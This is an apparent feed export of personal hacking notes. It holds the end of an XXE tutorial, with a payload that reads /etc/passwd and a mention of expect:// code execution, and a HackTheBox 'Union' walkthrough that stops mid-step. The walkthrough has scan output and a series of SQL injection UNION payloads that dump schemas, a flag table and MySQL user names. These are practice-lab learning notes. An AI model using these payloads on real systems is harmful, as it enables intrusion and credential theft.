&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;dt&quot;&gt;&amp;lt;!ELEMENT&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;heading&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;#PCDATA&lt;/span&gt;&lt;span class=&quot;dv&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;dt&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;dt&quot;&gt;&amp;lt;!ELEMENT&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;#PCDATA&lt;/span&gt;&lt;span class=&quot;dv&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;dt&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;]&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This defines the following XML:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode xml&quot;&gt;&lt;code class=&quot;sourceCode xml&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;?xml&lt;/span&gt; version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;&lt;span class=&quot;kw&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;&amp;lt;!DOCTYPE &lt;/span&gt;note SYSTEM &amp;quot;note.dtd&amp;quot;&lt;span class=&quot;dt&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-3&quot;&gt;&lt;a href=&quot;#cb2-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;note&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-4&quot;&gt;&lt;a href=&quot;#cb2-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;kw&quot;&gt;&amp;lt;to&amp;gt;&lt;/span&gt;foo&lt;span class=&quot;kw&quot;&gt;&amp;lt;/to&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-5&quot;&gt;&lt;a href=&quot;#cb2-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;kw&quot;&gt;&amp;lt;from&amp;gt;&lt;/span&gt;bar&lt;span class=&quot;kw&quot;&gt;&amp;lt;/from&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-6&quot;&gt;&lt;a href=&quot;#cb2-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;kw&quot;&gt;&amp;lt;heading&amp;gt;&lt;/span&gt;baz&lt;span class=&quot;kw&quot;&gt;&amp;lt;/heading&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-7&quot;&gt;&lt;a href=&quot;#cb2-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;kw&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;etc.&lt;span class=&quot;kw&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-8&quot;&gt;&lt;a href=&quot;#cb2-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;/note&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;(&lt;code&gt;#PCDATA&lt;/code&gt; indicates &quot;parsable character data&quot; - an XML-encoded string. The special SYSTEM keyword basically means &quot;this URI/file is hosted by the current system&quot;, and can be included in both !DOCTYPE and !ENTITY declarations.)&lt;/p&gt;&lt;p&gt;There are three basic important XML bits here:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;!DOCTYPE&lt;/code&gt; defines the document type &lt;em&gt;and&lt;/em&gt; the root element.&lt;/li&gt;&lt;li&gt;&lt;code&gt;!ELEMENT&lt;/code&gt; defines additional elements (so if I understand this correctly, a !DOCTYPE declaration must contain at least one !ELEMENT with the same name).&lt;/li&gt;&lt;li&gt;&lt;code&gt;!ENTITY&lt;/code&gt; defines entities like &lt;code&gt;&amp;amp;gt;&lt;/code&gt; - basically shortcuts for other data. There seems to be a lot more to XML entities than just this thoughâ¦&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Basically, you can think of the bit between the brackets (&lt;code&gt;[]&lt;/code&gt;) in the DTD as getting slotted into the URI specifying the DTD in the XML !DOCTYPE. In fact, we can insert additional document type definitions into the end of a !DOCTYPE statement in this way; combining this with the SYSTEM declaration can allow us to read any files the webserver has access to.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode xml&quot;&gt;&lt;code class=&quot;sourceCode xml&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;?xml&lt;/span&gt; version=&amp;quot;1.0&amp;quot;&lt;span class=&quot;kw&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;&amp;lt;!DOCTYPE &lt;/span&gt;root &lt;span class=&quot;dt&quot;&gt;[&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-3&quot;&gt;&lt;a href=&quot;#cb3-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;dt&quot;&gt;&amp;lt;!ENTITY&lt;/span&gt; read SYSTEM &lt;span class=&quot;st&quot;&gt;&amp;quot;file:///etc/passwd&amp;quot;&lt;/span&gt;&lt;span class=&quot;dt&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-4&quot;&gt;&lt;a href=&quot;#cb3-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;]&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-5&quot;&gt;&lt;a href=&quot;#cb3-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;root&amp;gt;&lt;/span&gt;&lt;span class=&quot;dv&quot;&gt;&amp;amp;read;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Note that the added !DOCTYPE declaration &lt;em&gt;doesn't&lt;/em&gt; have to correspond to the !DOCTYPE the server is using (since these definitions are concatenated). So don't spend too much time coming up with a !DOCTYPE in order to define your !ENTITY - any &quot;garbage&quot; !DOCTYPE will do.&lt;/p&gt;&lt;p&gt;This basically strikes me as more-or-less the same thing as an injection attack, just that we're targeting the XML parser rather than the website code.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://xmlwriter.net/xml_guide/entity_declaration.shtml&quot;&gt;ENTITY Declaration&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;remote-code-execution&quot;&gt;Remote Code Execution&lt;/h2&gt;&lt;p&gt;&lt;em&gt;If&lt;/em&gt; you're dealing with PHP, and &lt;em&gt;if&lt;/em&gt; the PHP expect module is loaded, and &lt;em&gt;if&lt;/em&gt; XML inputs aren't properly sanitized, then defining a SYSTEM entity with the value of &lt;code&gt;expect://$COMMAND&lt;/code&gt; will get you RCE!&lt;/p&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/XXE%20%28XML%20External%20Entity%29%20Attacks.md</guid>
		</item>
		<item>
			<title>Union</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Union.md</link>
			<description>&lt;p&gt;&lt;strong&gt;machine:&lt;/strong&gt; &lt;a href=&quot;https://app.hackthebox.com/machines/418&quot;&gt;https://app.hackthebox.com/machines/418&lt;/a&gt;&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;I joined the Discord server ~35 minutes late, as I was having trouble setting up the HackTheBox VPN (the solution was to change my VPN region to EU, then back to US, and &lt;em&gt;then&lt;/em&gt; re-download the &lt;code&gt;.ovpn&lt;/code&gt; file), and then didnât have the right invite link!&lt;/p&gt;&lt;p&gt;Anyways, this was my first box in a &lt;em&gt;long&lt;/em&gt; time, and boy am I rusty!&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;The target IP is 10.129.202.139 (at least initially). The &lt;code&gt;index.php&lt;/code&gt; page seems to accept any input (&lt;code&gt;player=foo&lt;/code&gt;), and directs the âplayerâ to the &lt;code&gt;challenge.php&lt;/code&gt; page. Thereâs a single-element form here, but it doesnât seem to do anything on submission (&lt;code&gt;flag=bar&lt;/code&gt;)?&lt;/p&gt;&lt;p&gt;Running &lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20%22gobuster%22.md&quot;&gt;&lt;code&gt;gobuster&lt;/code&gt;&lt;/a&gt; to try to enumerate potentially common directories:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;gobuster&lt;/span&gt; -t 50 dir -u http://10.129.202.139 -w /usr/share/wordlists/dirb/common.txt&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Results:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;/css       â /css/
/index.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Not much help there. Letâs try the same thing with some common extensions:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;gobuster&lt;/span&gt; -t 50 dir -u http://10.129.202.139 &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;         &lt;span class=&quot;ex&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirb/common.txt &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-3&quot;&gt;&lt;a href=&quot;#cb3-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;         &lt;span class=&quot;ex&quot;&gt;-x&lt;/span&gt; .php,.html,.htm,.txt,.md,.js,.css&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Results:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;/config.php
/css          â /css/
/firewall.php
/index.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&quot;https://www.freecodecamp.org/news/gobuster-tutorial-find-hidden-directories-sub-domains-and-s3-buckets/&quot;&gt;A general reminder about how to use gobuster.&lt;/a&gt;&lt;/p&gt;&lt;p&gt;The &lt;code&gt;/config.php&lt;/code&gt; and &lt;code&gt;/firewall.php&lt;/code&gt; files look interesting!&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;/config.php&lt;/code&gt; just returns a zero-length document. Booo!&lt;/li&gt;&lt;li&gt;&lt;code&gt;/firewall.php&lt;/code&gt; just returns &lt;code&gt;Access Denied&lt;/code&gt; .&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Alright, letâs try &lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20%22nmap%22.md&quot;&gt;nmap&lt;/a&gt;:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb5&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb5-1&quot;&gt;&lt;a href=&quot;#cb5-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; nmap -v -oN union -Pn -A --reason -T4 -p- 10.129.202.139&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Output:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;Host discovery disabled (-Pn). All addresses will be marked &amp;#39;up&amp;#39; and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-27 19:24 MDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 19:24
Completed NSE at 19:24, 0.00s elapsed
Initiating NSE at 19:24
Completed NSE at 19:24, 0.00s elapsed
Initiating NSE at 19:24
Completed NSE at 19:24, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 19:24
Completed Parallel DNS resolution of 1 host. at 19:24, 0.02s elapsed
Initiating SYN Stealth Scan at 19:24
Scanning 10.129.202.139 [65535 ports]
Discovered open port 80/tcp on 10.129.202.139
SYN Stealth Scan Timing: About 21.06% done; ETC: 19:26 (0:01:56 remaining)
SYN Stealth Scan Timing: About 55.83% done; ETC: 19:26 (0:00:48 remaining)
Completed SYN Stealth Scan at 19:25, 91.51s elapsed (65535 total ports)
Initiating Service scan at 19:25
Scanning 1 service on 10.129.202.139
Completed Service scan at 19:26, 6.12s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 10.129.202.139
Retrying OS detection (try #2) against 10.129.202.139
Initiating Traceroute at 19:26
Completed Traceroute at 19:26, 0.07s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 19:26
Completed Parallel DNS resolution of 2 hosts. at 19:26, 0.02s elapsed
NSE: Script scanning 10.129.202.139.
Initiating NSE at 19:26
Completed NSE at 19:26, 5.07s elapsed
Initiating NSE at 19:26
Completed NSE at 19:26, 0.22s elapsed
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
Nmap scan report for 10.129.202.139
Host is up, received user-set (0.058s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|http-server-header: nginx/1.18.0 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-title: Site doesn&amp;#39;t have a title (text/html; charset=UTF-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (94%), Linux 4.15 - 5.6 (92%), Linux 5.0 - 5.4 (91%), Linux 5.3 - 5.4 (91%), Linux 5.0 (90%), Linux 5.0 - 5.3 (90%), Linux 5.4 (90%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 27.153 days (since Fri Mar 31 15:46:21 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   63.08 ms 10.10.14.1
2   63.24 ms 10.129.202.139

NSE: Script Post-scanning.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.94 seconds
           Raw packets sent: 131215 (5.777MB) | Rcvd: 251 (19.772KB)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Well, thatâs less than helpful; we already knew that there was a web server running on port 80 (and thereâs nothing else).&lt;/p&gt;&lt;p&gt;Okay, letâs try fuzzing the two pages with Burp Suite and see what we get! Interesting observations...&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;/index.php&lt;/code&gt;&lt;ol&gt;&lt;li&gt;Submitting hexadecimal numbers for &lt;code&gt;player&lt;/code&gt; (for example, 0x0 or 0xabad1dea) result in only the &lt;em&gt;first&lt;/em&gt; half of the normal response, without any HTML or the &lt;code&gt;/challenge.php&lt;/code&gt; link.&lt;/li&gt;&lt;li&gt;You can insert any HTML youâd like, and it gets rendered back in the page.&lt;/li&gt;&lt;li&gt;Inputs always seem to be lower-cased before theyâre returned.&lt;/li&gt;&lt;li&gt;&lt;code&gt;' OR 1=1 -- 1&lt;/code&gt; and &lt;code&gt;' OR '1'='1&lt;/code&gt; are &lt;em&gt;also&lt;/em&gt; missing the second half of the response, like the 0x numbers. So maybe we have &lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/SQL%20Injection.md&quot;&gt;SQL injection&lt;/a&gt;?&lt;/li&gt;&lt;/ol&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;/challenge.php&lt;/code&gt; returns nothing interesting...&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;(I really need a more targeted fuzzing list than the âbig list of naughty stringsâ, as the free version of Burp Suite throttles Intruder so much that this list takes over 30 minutes to process!)&lt;/p&gt;&lt;p&gt;(Also, be sure to look at the response in &lt;strong&gt;Raw&lt;/strong&gt; mode to avoid going down bunny trails about formatting changes that â&lt;em&gt;donât actually exist in the server response&lt;/em&gt;â!)&lt;/p&gt;&lt;p&gt;Okay, so not many clues at this point. SQL injection &lt;em&gt;might&lt;/em&gt; be a thing, but the behavior with hexadecimal numbers is... Odd.&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;So, here Iâm going to âcheatâ a bit. I know from the discussion on Discord that SQL injection &lt;em&gt;is&lt;/em&gt; a thing for this box, and is, in fact, how you get the first flag. So even though my evidence at this point is circumstantial/weak, Iâm going to go that route.&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;Since &lt;code&gt;' OR 1=1 -- 1&lt;/code&gt; gave us something interesting, letâs send &lt;code&gt;/index.php&lt;/code&gt; to Repeater and see what some other values for &lt;code&gt;player&lt;/code&gt; do for us...&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT '&amp;gt;&amp;gt;&amp;gt;STUFF&amp;lt;&amp;lt;&amp;lt;' -- 1&lt;/code&gt; returns &lt;code&gt;&amp;gt;&amp;gt;&amp;gt;STUFF&amp;lt;&amp;lt;&amp;lt;&lt;/code&gt; for the user name!&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT @@datadir -- 1&lt;/code&gt; returns &lt;code&gt;/var/lib/mysql&lt;/code&gt; , so weâre dealing with MySQL.&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT schema_name FROM information_schema.schemata -- 1&lt;/code&gt; returns &lt;code&gt;mysql&lt;/code&gt; ... Which isnât right. It looks like only a single row (probably the last one, given that we only see one row with &lt;code&gt;UNION&lt;/code&gt; ) is returned.&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET 0 -- 1&lt;/code&gt; also returns &lt;code&gt;mysql&lt;/code&gt; ... But using &lt;code&gt;OFFSET 1&lt;/code&gt; returns &lt;code&gt;information_schema&lt;/code&gt; , so I guess weâll just do it this way. Iterating, we also see databases called &lt;code&gt;performance_schema&lt;/code&gt; , &lt;code&gt;sys&lt;/code&gt; , and &lt;code&gt;november&lt;/code&gt; . All of these are standard MySQL databases except for &lt;code&gt;november&lt;/code&gt; .&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT database() -- 1&lt;/code&gt; confirms that weâre in the &lt;code&gt;november&lt;/code&gt; database.&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT table_name FROM information_schema.tables WHERE table_schema != 'november' LIMIT 1 OFFSET 0 -- 1&lt;/code&gt; returns &lt;code&gt;flag&lt;/code&gt; , and iterating reveals a second table &lt;code&gt;players&lt;/code&gt; . There doesnât seem to be anything else. The &lt;code&gt;flag&lt;/code&gt; table looks promising, so letâs see whatâs there.&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT column_name FROM information_schema.columns WHERE table_schema = 'november' and table_name = 'flag' LIMIT 1 OFFSET 0 -- 1&lt;/code&gt; (and iterating) reveals that thereâs a single column called &lt;code&gt;one&lt;/code&gt; .&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT COUNT(*) FROM flag -- 1&lt;/code&gt; reveals that thereâs only a single row in &lt;code&gt;flag&lt;/code&gt; . Easy!&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT one FROM flag -- 1&lt;/code&gt; then provides a âflagâ value.&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;(The above is made possible using &lt;a href=&quot;https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&quot;&gt;this handy SQL injection cheat-sheet for MySQL&lt;/a&gt;.)&lt;/p&gt;&lt;p&gt;Now, as it turns out, this is &lt;em&gt;not&lt;/em&gt; a flag for the box! Instead, inputting it into &lt;code&gt;/challenge.php&lt;/code&gt; generates the message that &lt;code&gt;Your IP Address has now been granted SSH Access&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Letâs confirm...&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb7&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb7-1&quot;&gt;&lt;a href=&quot;#cb7-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; nmap -v -oN union2 -Pn -A --reason -T4 -p- 10.129.202.139&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Output:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;Host discovery disabled (-Pn). All addresses will be marked &amp;#39;up&amp;#39; and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-27 21:16 MDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 21:16
Completed NSE at 21:16, 0.00s elapsed
Initiating NSE at 21:16
Completed NSE at 21:16, 0.00s elapsed
Initiating NSE at 21:16
Completed NSE at 21:16, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 21:16
Completed Parallel DNS resolution of 1 host. at 21:16, 0.01s elapsed
Initiating SYN Stealth Scan at 21:16
Scanning 10.129.202.139 [65535 ports]
Discovered open port 22/tcp on 10.129.202.139
Discovered open port 80/tcp on 10.129.202.139
Completed SYN Stealth Scan at 21:17, 35.32s elapsed (65535 total ports)
Initiating Service scan at 21:17
Scanning 2 services on 10.129.202.139
Completed Service scan at 21:17, 6.12s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.129.202.139
Retrying OS detection (try #2) against 10.129.202.139
Retrying OS detection (try #3) against 10.129.202.139
Retrying OS detection (try #4) against 10.129.202.139
Retrying OS detection (try #5) against 10.129.202.139
Initiating Traceroute at 21:17
Completed Traceroute at 21:17, 0.06s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 21:17
Completed Parallel DNS resolution of 2 hosts. at 21:17, 0.01s elapsed
NSE: Script scanning 10.129.202.139.
Initiating NSE at 21:17
Completed NSE at 21:17, 1.73s elapsed
Initiating NSE at 21:17
Completed NSE at 21:17, 0.27s elapsed
Initiating NSE at 21:17
Completed NSE at 21:17, 0.02s elapsed
Nmap scan report for 10.129.202.139
Host is up, received user-set (0.054s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)
|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)
|_  256 2221e9f485908745161f733641ee3b32 (ED25519)
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|http-title: Site doesn&amp;#39;t have a title (text/html; charset=UTF-8).
| http-methods:
|  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=4/27%OT=22%CT=1%CU=31913%PV=Y%DS=2%DC=T%G=Y%TM=644B3AD
OS:9%P=aarch64-unknown-linux-gnu)SEQ(SP=100%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS
OS:=A)OPS(O1=M550ST11NW7%O2=M550ST11NW7%O3=M550NNT11NW7%O4=M550ST11NW7%O5=M
OS:550ST11NW7%O6=M550ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE
OS:88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M550NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A
OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
OS:=40%CD=S)

Uptime guess: 27.230 days (since Fri Mar 31 15:46:20 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   56.02 ms 10.10.14.1
2   56.12 ms 10.129.202.139

NSE: Script Post-scanning.
Initiating NSE at 21:17
Completed NSE at 21:17, 0.00s elapsed
Initiating NSE at 21:17
Completed NSE at 21:17, 0.00s elapsed
Initiating NSE at 21:17
Completed NSE at 21:17, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.07 seconds
           Raw packets sent: 66144 (2.914MB) | Rcvd: 65710 (2.632MB)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So, we definitely have an open SSH port now! But what user to use?&lt;/p&gt;&lt;p&gt;Maybe thereâs password re-use with MySQL? Letâs see what weâve got:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT COUNT(*) FROM mysql.user -- 1&lt;/code&gt; shows that we have 6 users.&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT user FROM mysql.user LIMIT 1 OFFSET 0 -- 1&lt;/code&gt; (and iterating) shows that these users are &lt;code&gt;debian-sys-maint&lt;/code&gt;, &lt;code&gt;mysql.infoschema&lt;/code&gt;, &lt;code&gt;mysql.session&lt;/code&gt;, &lt;code&gt;mysql.sys&lt;/code&gt;, &lt;code&gt;root&lt;/code&gt;, and &lt;code&gt;uhc&lt;/code&gt;. Both &lt;code&gt;root&lt;/code&gt; and &lt;code&gt;uhc&lt;/code&gt; look promising.&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT host FROM mysql.user WHERE user = 'root' -- 